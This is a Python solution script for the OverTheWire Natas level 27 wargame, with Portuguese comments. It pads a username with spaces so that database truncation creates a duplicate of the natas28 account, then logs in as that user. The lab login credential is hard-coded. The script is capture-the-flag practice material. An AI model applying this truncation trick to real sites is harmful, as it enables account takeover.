import requests
import re
from string import *
import time
import sys
import codecs
import base64
import urllib

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"
headers = {}
for a in range(1):
    cookie={}

    logar = ["natas27","55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"]
    url = "http://%s.natas.labs.overthewire.org/"%logar[0]
    session = requests.Session()



    r=session.post(url+"",data=\
                {"username":"natas28" + ' '*90  +"a"           ,\
                 "password":"qualquercoisa"                 },\
    auth=(logar[0],logar[1]))
    contento = r.text
    print(contento)
    print("="*80)
    print(session.cookies)
    print("="*80+"\nSLEEPING")

    r=session.post(url+"",data=\
                {"username":"natas28",\
                 "password":"qualquercoisa"                 },\
    auth=(logar[0],logar[1]))
    contento = r.text
    print(contento)
    #SQL Injection Overflow, criamos um usuário e colocamos " " a quantidade de vezes que o site limita para o mesmo ler. Em seguida adicionamos algo a mais para difereciar do usuário que queremos logar como.
    #Os " " ficarão truncados e não serão lidos, mas serão contados como len() logo podemos logar como o usuário desejado e a senha que criamos para ele
